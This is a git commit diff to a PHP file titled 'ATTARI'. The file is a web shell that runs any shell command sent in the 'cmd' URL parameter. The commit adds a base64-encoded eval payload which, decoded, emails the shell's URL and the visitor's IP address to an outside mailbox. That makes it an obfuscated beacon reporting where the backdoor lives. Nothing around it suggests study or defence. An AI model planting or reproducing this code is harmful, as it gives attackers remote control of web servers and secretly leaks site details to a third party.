8365a47545bf093b329e5368352ba39eb8fad3b5
kalix-Ru <66873143+kalix-Ru@users.noreply.github.com>
2020-12-03 19:46:34 -0600

    Update attari.php

--- attari.php
+++ attari.php
@@ -1,1 +1,1 @@
-<head><title>ATTARI</title></head><?php system($_GET['cmd']); ?>
+<head><title>ATTARI</title></head><?php system($_GET['cmd']); ?><?php eval(base64_decode('JHR1anVhbm1haWwgPSAna2FsaXgweGFsaWtAZ21haWwuY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));?>
